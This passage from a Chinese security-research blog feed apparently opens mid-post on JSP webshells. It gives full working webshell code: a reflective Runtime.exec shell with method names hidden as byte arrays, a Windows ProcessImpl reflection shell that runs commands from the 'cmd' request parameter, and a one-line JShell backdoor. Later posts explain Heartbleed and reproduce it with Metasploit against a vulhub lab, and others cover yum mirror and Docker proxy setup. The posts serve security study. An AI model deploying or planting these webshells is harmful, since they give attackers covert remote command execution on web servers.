class="hljs-variable">m1</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>}));<br>    <span class="hljs-comment">// 反射获取Runtime类的exec方法</span><br>    <span class="hljs-type">Method</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>}), String.class);<br>    <span class="hljs-comment">// 反射调用Runtime.getRuntime().exec(xxx)方法</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> m2.invoke(m1.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{}), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{str});<br>    <span class="hljs-comment">// 反射获取Process类的getInputStream方法</span><br>    <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> obj2.getClass().getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">73</span>, <span class="hljs-number">110</span>, <span class="hljs-number">112</span>, <span class="hljs-number">117</span>, <span class="hljs-number">116</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">109</span>}));<br>    m.setAccessible(<span class="hljs-literal">true</span>);<br><br>    <span class="hljs-comment">// 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串</span><br>    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>((InputStream) m.invoke(obj2, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{})).useDelimiter(<span class="hljs-string">"\\A"</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">""</span>;<br>    out.println(result);<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="NIXProcess-ProcessImpl"><a href="#NIXProcess-ProcessImpl" class="headerlink" title="NIXProcess/ProcessImpl"></a>NIXProcess/ProcessImpl</h3><p><code>ProcessBuilder</code>在实现时调用了<code>ProcessImpl</code></p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240910103730593.png" class="" title="image-20240910103730593"><p><code>UNIXProcess</code>和<code>ProcessImpl</code>可以理解本就是一个东西，因为在JDK9的时候把<code>UNIXProcess</code>合并到了<code>ProcessImpl</code>当中了,参考<a href="https://hg.openjdk.java.net/jdk-updates/jdk9u/jdk/rev/98eb910c9a97">changeset 11315:98eb910c9a97</a>。</p><p><code>UNIXProcess</code>和<code>ProcessImpl</code>其实就是最终调用<code>native</code>执行系统命令的类，这个类提供了一个叫<code>forkAndExec</code>的native方法，如方法名所述主要是通过<code>fork&amp;exec</code>来执行本地系统命令。</p><p><code>UNIXProcess</code>类的<code>forkAndExec</code>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">forkAndExec</span><span class="hljs-params">(<span class="hljs-type">int</span> mode, <span class="hljs-type">byte</span>[] helperpath,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] prog,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] argBlock, <span class="hljs-type">int</span> argc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] envBlock, <span class="hljs-type">int</span> envc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] dir,</span><br><span class="hljs-params">                                   <span class="hljs-type">int</span>[] fds,</span><br><span class="hljs-params">                                   <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException;<br></code></pre></td></tr></table></figure><p>最终执行的<code>Java_java_lang_ProcessImpl_forkAndExec</code>完整代码:<a href="https://github.com/unofficial-openjdk/openjdk/blob/e59bd5b27066bb2eb77828110ee585b1598ba636/src/java.base/unix/native/libjava/ProcessImpl_md.c">ProcessImpl_md.c</a></p><h3 id="反射UNIXProcess-ProcessImpl执行本地命令"><a href="#反射UNIXProcess-ProcessImpl执行本地命令" class="headerlink" title="反射UNIXProcess/ProcessImpl执行本地命令"></a>反射UNIXProcess/ProcessImpl执行本地命令</h3><p>这里JavaSec的指导书里面只写了Linux的Shell，我这里写一下Win下的。</p><p>首先我们需要知道Win系统下ProcessImpl是如何执行的，那么我们可以使用前面ProcessBuilder的Shell，然后在<code>new ProcessBuilder</code>那里打上断点，然后启动Tomcat进行调试，然后我们步进到<code>PrcocessImpl.java</code>文件，在其322行的位置打上断点，直接继续运行，可以看到此时<code>ProcessImpl</code>的构造函数的参数是多少，然后我们在WebShell里面仿照构造就行了。</p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240910152220961.png" class=""><p>最后的代码如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;WinRefProcessImplShell&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.*"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Constructor"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Method"</span> %&gt;<br>&lt;%!<br>    InputStream <span class="hljs-title function_">start</span><span class="hljs-params">(String[] cmds)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-comment">// java.lang.ProcessImpl</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>});<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// 反射创建ProcessImpl</span><br>        clazz = Class.forName(processClass);<br>        <span class="hljs-comment">// 获取UNIXProcess或者ProcessImpl的构造方法</span><br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-keyword">assert</span> cmds != <span class="hljs-literal">null</span> &amp;&amp; cmds.length &gt; <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// In theory, close() can throw IOException</span><br>        <span class="hljs-comment">// (although it is rather unlikely to happen here)</span><br>        <span class="hljs-keyword">try</span> {<br>            <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close();<br>        } <span class="hljs-keyword">finally</span> {<br>            <span class="hljs-keyword">try</span> {<br>                <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close();<br>            } <span class="hljs-keyword">finally</span> {<br>                <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close();<br>            }<br>        }<br>        <span class="hljs-comment">// 创建ProcessImpl实例</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> constructor.newInstance(<br>                cmds,<br>                <span class="hljs-literal">null</span>,<br>                <span class="hljs-literal">null</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[]{-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>},<br>                <span class="hljs-literal">false</span><br>        );<br>        <span class="hljs-comment">// 获取命令执行的InputStream</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">inMethod</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredMethod(<span class="hljs-string">"getInputStream"</span>);<br>        inMethod.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-keyword">return</span> (InputStream) inMethod.invoke(object);<br>    }<br>    <br>    String <span class="hljs-title function_">inputStreamToString</span><span class="hljs-params">(InputStream in, String charset)</span> <span class="hljs-keyword">throws</span> IOException {<br>        <span class="hljs-keyword">try</span> {<br>            <span class="hljs-keyword">if</span> (charset == <span class="hljs-literal">null</span>) {<br>                charset = <span class="hljs-string">"UTF-8"</span>;<br>            }<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) {<br>                out.write(b, <span class="hljs-number">0</span>, a);<br>            }<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(out.toByteArray());<br>        } <span class="hljs-keyword">catch</span> (IOException e) {<br>            <span class="hljs-keyword">throw</span> e;<br>        } <span class="hljs-keyword">finally</span> {<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>)<br>                in.close();<br>        }<br>    }<br>%&gt;<br>&lt;%<br>    String[] cmds = request.getParameterValues(<span class="hljs-string">"cmd"</span>);<br><br>    <span class="hljs-keyword">if</span> (cmds != <span class="hljs-literal">null</span>) {<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> start(cmds);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> inputStreamToString(in, <span class="hljs-string">"UTF-8"</span>);<br>        out.println(<span class="hljs-string">"&lt;pre&gt;"</span>);<br>        out.println(result);<br>        out.println(<span class="hljs-string">"&lt;/pre&gt;"</span>);<br>        out.flush();<br>        out.close();<br>    }<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="JShell执行系统命令"><a href="#JShell执行系统命令" class="headerlink" title="JShell执行系统命令"></a>JShell执行系统命令</h3><p>我还是第一次听说这个东西，还是太菜了。</p><p>从<code>Java 9</code>开始提供了一个叫<code>jshell</code>的功能，<code>jshell</code>是一个<code>REPL(Read-Eval-Print Loop)</code>命令行工具，提供了一个交互式命令行界面，在<code>jshell</code>中我们不再需要编写类也可以执行Java代码片段，开发者可以像<code>python</code>和<code>php</code>一样在命令行下愉快的写测试代码了。</p><p>命令行执行<code>jshell</code>即可进入<code>jshell</code>模式：</p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240910161456804.png" class="" title="image-20240910161456804"><p><code>jshell</code>不仅是一个命令行工具，在我们的应用程序中同样也可以调用<code>jshell</code>内部的实现API，也就是说我们可以利用<code>jshell</code>来执行Java代码片段而不再需要将Java代码编译成class文件后执行了。</p><p><code>jshell</code>调用了<code>jdk.jshell.JShell</code>类的<code>eval</code>方法来执行我们的代码片段，那么我们只要想办法调用这个<code>eval</code>方法也就可以实现真正意义上的一句话木马了。</p><p><strong><code>jshell.jsp</code>一句话木马示例:</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%=jdk.jshell.JShell.builder().build().eval(request.getParameter(<span class="hljs-string">"cmd"</span>))%&gt;<br></code></pre></td></tr></table></figure><p>只输出关键信息，修改为：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%=jdk.jshell.JShell.builder().build().eval(request.getParameter(<span class="hljs-string">"cmd"</span>)).get(<span class="hljs-number">0</span>).value().replaceAll(<span class="hljs-string">"^\""</span>, <span class="hljs-string">""</span>).replaceAll(<span class="hljs-string">"\"$"</span>, <span class="hljs-string">""</span>)%&gt;<br></code></pre></td></tr></table></figure><p>然后我们需要编写一个执行本地命令的代码片段：也就是参数``cmd`的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Runtime.getRuntime().exec(<span class="hljs-string">"pwd"</span>).getInputStream().readAllBytes())<br></code></pre></td></tr></table></figure><p><code>Java 9</code>的<code>java.io.InputStream</code>类正好提供了一个<code>readAllBytes</code>方法，我们从此以后再也不需要按字节读取了。</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>更换各种源的方法</title>
    <link href="/2024/07/30/%E6%9B%B4%E6%8D%A2%E5%90%84%E7%A7%8D%E6%BA%90%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <url>/2024/07/30/%E6%9B%B4%E6%8D%A2%E5%90%84%E7%A7%8D%E6%BA%90%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>记录各种需要换源的应用</p><span id="more"></span><h2 id="更换yum源"><a href="#更换yum源" class="headerlink" title="更换yum源"></a>更换yum源</h2><p>替换为阿里源</p><p>备份</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak<br></code></pre></td></tr></table></figure><p>替换</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo<br></code></pre></td></tr></table></figure><p>生成缓存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum makecache<br></code></pre></td></tr></table></figure><p>更新软件列表</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y update<br></code></pre></td></tr></table></figure><img src="/2024/07/30/%E6%9B%B4%E6%8D%A2%E5%90%84%E7%A7%8D%E6%BA%90%E7%9A%84%E6%96%B9%E6%B3%95/image-20240730205730178.png" class="" title="image-20240730205730178"><p>使用国内源就非常快了</p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>心脏滴血漏洞分析与复现</title>
    <link href="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>之前写了TLS的详解，这里拓展一下心脏滴血这个声名远播的老洞</p><span id="more"></span><h2 id="心脏滴血漏洞-CVE-2014-0160"><a href="#心脏滴血漏洞-CVE-2014-0160" class="headerlink" title="心脏滴血漏洞(CVE-2014-0160)"></a>心脏滴血漏洞(CVE-2014-0160)</h2><p>一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。</p><p>此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过滤，即可以读取的数据比应该允许读取的还多。</p><p>HeartBleed主要存在与OpenSSL的1.0.1版本到1.0.1f版本。</p><p>利用该漏洞，攻击者每次可以远程读取服务器内存中至多64K的数据，获取内存中的敏感信息。</p><h3 id="心跳包"><a href="#心跳包" class="headerlink" title="心跳包"></a>心跳包</h3><p>可以简单了解一下心跳包的作用，它是一种用于保持TLS连接活跃并检测连接状态的小型数据包。在TLS连接建立之后，定期发送心跳包以确保连接在长时间没有数据传输时不被中断。如果未收到预期的响应，表明连接可能已断开或出现问题。</p><p>那么心跳请求是如何工作的：</p><p>心跳扩展允许一个TLS对等体向另一个对等体发送一个心跳请求，接收方应以心跳响应形式回送相同的数据。具体流程如下：</p><ol><li>心跳请求：一方发送包含随机数据和请求类型的心跳请求消息。</li><li>心跳响应：接收方在接收到心跳请求后，必须在心跳响应消息中返回相同的随机数据。</li></ol><p><strong>心跳消息的格式</strong>：</p><ul><li>类型：心跳请求或心跳响应。</li><li>Payload长度：负载数据的长度。</li><li>Payload数据：实际的负载数据，可以是任意内容。</li><li>Padding：可选的填充数据，确保消息长度符合特定要求。</li></ul><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>那么这个心脏滴血漏洞是如何形成的呢，其实很简单</p><p>在客户端发送完心跳包之后，服务端会短暂的存储心跳包中的内容，分配一个内存缓冲区（一个物理内存区域用以存储信息），<strong>该区域的存储空间和心跳请求信号里的长度一致</strong>。接下来，它会存储请求信号的加密数据到内存缓冲区，然后读取数据并将其发送回你的浏览器，来证明连接仍然存在。</p><p>关键是，OpenSSL官方编写的库函数里<strong>没有检查这个客户端心跳包的实际内容和它给定的长度</strong>，也就是说本身是一个10字节的数据，客户端声明了20字节的内容，服务端就会开辟20字节的空间，导致服务端返回了20字节的数据。</p><p>一句话：<strong>计算机接受心跳请求时从不检查该请求和它声称的内容是否一致，及从不检查所请求的数据长度是否和声称的数据长度一致，导致响应方返回额外长度的数据</strong>。</p><p>导致心脏出血漏洞的编程错误可以归于一行代码：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">memcpy</span>(bp, pl, payload);<br></code></pre></td></tr></table></figure><p>memcpy()是复制数据的命令。bp是被复制的数据的存储区域，pl是被复制的数据的来源，payload是被复制的数据长度。<strong>问题在于，该命令没有检验pl复制的数据是否和payload给予的长度相符。</strong></p><p>所有原理其实非常简单，早期的开发存在极大的安全隐患。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>首先默认已经配置好了docker以及下载了vulhub，打开openssl/CVE-2014-0160，使用<code>docker-compose up -d</code>拉取镜像，然后环境就搭建好了，攻击使用metasploit。</p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730213652497.png" class="" title="image-20240730213652497"><p>使用<code>docker ps</code>查看一下容器的状态，发现TCP服务开启在8080和8443端口。当然实际攻击使用端口扫描工具可以探测出来，比如Nmap。</p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730213838295.png" class="" title="image-20240730213838295"><p>接着我们打开Kali，使用命令<code>msfconsole</code>打开Metaspolit</p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730213959855.png" class="" title="image-20240730213959855"><p>搜索心脏滴血漏洞，然后<code>use 1</code></p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730214331388.png" class="" title="image-20240730214331388"><p>然后设置IP和端口，run就可以实现信息泄露，</p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730214812629.png" class="" title="image-20240730214812629"><p>结束</p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机中docker配置代理</title>
    <link href="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <url>/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>不知道为啥Ubuntu里docker拉取镜像很慢，国内被墙了？</p><span id="more"></span><p>我这里的虚拟机是Ubuntu20.04</p><p>安装docker的具体步骤我这里就不说了，可以参考<a href="https://www.cnblogs.com/Can-daydayup/p/16472375.html">这篇文章</a></p><p><strong>这里主要说docker拉取镜像慢的问题</strong></p><h3 id="配置虚拟机流量走物理机代理"><a href="#配置虚拟机流量走物理机代理" class="headerlink" title="配置虚拟机流量走物理机代理"></a>配置虚拟机流量走物理机代理</h3><p>这里使用的代理软件是Clash.for.Windows，在其中开启允许局域网连接</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720200640809.png" class="" title="image-20240720200640809"><p>然查看一下物理机VM的NAT网卡的地址，</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720200730608.png" class="" title="image-20240720200730608"><p>在虚拟机中配置一下代理，</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720200925732.png" class="" title="image-20240720200925732"><p>配置一下HTTP和HTTPS一般就行了，然后填入物理机的局域网IP和你代理的端口号</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720201038704.png" class="" title="image-20240720201038704"><p>然后这里你的虚拟机流量就可以走物理机的代理了</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720201135135.png" class="" title="image-20240720201135135"><h3 id="配置docker-pull的代理"><a href="#配置docker-pull的代理" class="headerlink" title="配置docker pull的代理"></a>配置docker pull的代理</h3><p>使用下面的命令创建配置文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d<br>sudo vim /etc/systemd/system/docker.service.d/http-proxy.conf<br></code></pre></td></tr></table></figure><p>填充配置文件的内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">[Service]<br>Environment=<span class="hljs-string">"HTTP_PROXY=http://YOUR_PROXY_URL"</span><br>Environment=<span class="hljs-string">"HTTPS_PROXY=http://YOUR_PROXY_URL"</span><br>Environment=<span class="hljs-string">"NO_PROXY=localhost,127.0.0.1"</span><br></code></pre></td></tr></table></figure><p>然后重新加载docker：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><p>然后就能愉快地拉取docker了</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720201526542.png" class="" title="image-20240720201526542"><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720201625072.png" class="" title="image-20240720201625072">]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-46604分析</title>
    <link href="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/</url>
    
